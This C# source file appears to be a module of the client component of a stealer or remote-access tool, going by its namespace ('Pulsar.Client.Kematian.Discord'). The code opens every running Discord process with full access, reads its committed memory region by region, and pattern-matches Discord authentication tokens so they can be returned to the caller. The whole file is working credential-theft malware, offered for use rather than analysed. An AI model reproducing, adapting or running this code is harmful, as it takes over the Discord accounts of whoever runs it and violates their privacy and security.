﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Client.Kematian.Discord.Methods.Memory
{
    public class GetTokensFromMemory
    {
        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint PAGE_READABLE = 0x04 | 0x02 | 0x20;
        const int MAX_REGION_SIZE = 0x7FFFFFFF;
        const int BUFFER_SIZE = 1024 * 1024 * 4;

        static readonly byte[] SharedBuffer = new byte[BUFFER_SIZE];
        static readonly object BufferLock = new object();

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress,
            out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, long dwSize, out IntPtr lpNumberOfBytesRead);

        static bool IsValidChar(char c)
        {
            return (c >= 'a' && c <= 'z') ||
                   (c >= 'A' && c <= 'Z') ||
                   (c >= '0' && c <= '9') ||
                   c == '-' || c == '_';
        }

        static string ScanForFirstToken(string data)
        {
            int len = data.Length;

            for (int i = 0; i < len - 70; i++) // Minimum token length is 26 + 1 + 6 + 1 + 38 = 72
            {
                if (!IsValidChar(data[i])) continue;

                int start = i;
                int validCount = 0;

                // Check first segment (26 chars)
                while (validCount < 26 && i < len && IsValidChar(data[i]))
                {
                    validCount++;
                    i++;
                }

                if (validCount != 26 || i >= len || data[i] != '.')
                {
                    i = start;
                    continue;
                }
                i++; // Skip dot

                // Check second segment (6 chars)
                validCount = 0;
                while (validCount < 6 && i < len && IsValidChar(data[i]))
                {
                    validCount++;
                    i++;
                }

                if (validCount != 6 || i >= len || data[i] != '.')
                {
                    i = start;
                    continue;
                }
                i++; // Skip dot

                // Check third segment (38 chars)
                validCount = 0;
                while (validCount < 38 && i < len && IsValidChar(data[i]))
                {
                    validCount++;
                    i++;
                }

                if (validCount == 38)
                {
                    return data.Substring(start, 72); // 26 + 1 + 6 + 1 + 38 = 72
                }

                i = start;
            }

            return null;
        }

        static string ProcessMemoryChunk(byte[] buffer, int bytesRead)
        {
            try
            {
                string decodedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                return ScanForFirstToken(decodedData);
            }
            catch
            {
                return null;
            }
        }

        static string DumpMemory(int pid, CancellationToken cancellationToken)
        {
            IntPtr handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

            if (handle == IntPtr.Zero)
            {
                Debug.WriteLine($"Failed to open process {pid}");
                return null;
            }

            try
            {
                IntPtr address = IntPtr.Zero;
                var memInfo = new MEMORY_BASIC_INFORMATION();
                int memInfoSize = Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));

                while (!cancellationToken.IsCancellationRequested)
                {
                    int result = VirtualQueryEx(handle, address, out memInfo, (uint)memInfoSize);
                    if (result == 0) break;

                    if (memInfo.State == MEM_COMMIT && (memInfo.Protect & PAGE_READABLE) != 0)
                    {
                        long regionSize = memInfo.RegionSize.ToInt64();
                        if (regionSize > 0 && regionSize < MAX_REGION_SIZE)
                        {
                            for (long offset = 0; offset < regionSize && !cancellationToken.IsCancellationRequested; offset += BUFFER_SIZE)
                            {
                                int chunkSize = (int)Math.Min(BUFFER_SIZE, regionSize - offset);

                                lock (BufferLock)
                                {
                                    var baseAddress = IntPtr.Add(memInfo.BaseAddress, (int)offset);

                                    if (ReadProcessMemory(handle, baseAddress, SharedBuffer, chunkSize, out IntPtr bytesRead))
                                    {
                                        int actualBytesRead = bytesRead.ToInt32();
                                        if (actualBytesRead > 0)
                                        {
                                            string match = ProcessMemoryChunk(SharedBuffer, actualBytesRead);
                                            if (match != null)
                                            {
                                                return match;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }

                    if (cancellationToken.IsCancellationRequested) break;

                    try
                    {
                        long nextAddress = memInfo.BaseAddress.ToInt64() + memInfo.RegionSize.ToInt64();
                        if (nextAddress < 0) break;
                        address = new IntPtr(nextAddress);
                    }
                    catch (OverflowException)
                    {
                        break;
                    }
                }
            }
            finally
            {
                CloseHandle(handle);
            }

            return null;
        }

        static int[] GetPids()
        {
            var processes = Process.GetProcessesByName("discord");
            Array.Sort(processes, (x, y) => y.WorkingSet64.CompareTo(x.WorkingSet64));

            var pids = new List<int>();
            foreach (var process in processes)
            {
                pids.Add(process.Id);
            }
            return pids.ToArray();
        }

        public static string[] Tokens()
        {
            string token = null;
            var pids = GetPids();

            using (var cts = new CancellationTokenSource())
            {
                try
                {
                    var parallelOptions = new ParallelOptions
                    {
                        CancellationToken = cts.Token,
                        MaxDegreeOfParallelism = Environment.ProcessorCount
                    };

                    Parallel.ForEach(pids, parallelOptions, (pid, state) =>
                    {
                        try
                        {
                            var foundToken = DumpMemory(pid, cts.Token);
                            if (foundToken != null)
                            {
                                if (Interlocked.CompareExchange(ref token, foundToken, null) == null)
                                {
                                    cts.Cancel();
                                    state.Stop();
                                }
                            }
                        }
                        catch (OperationCanceledException)
                        {
                            state.Stop();
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error processing PID {pid}: {ex.Message}");
                        }
                    });
                }
                catch (OperationCanceledException) { }
            }
            return token != null ? new[] { token } : new string[0];
        }
    }
}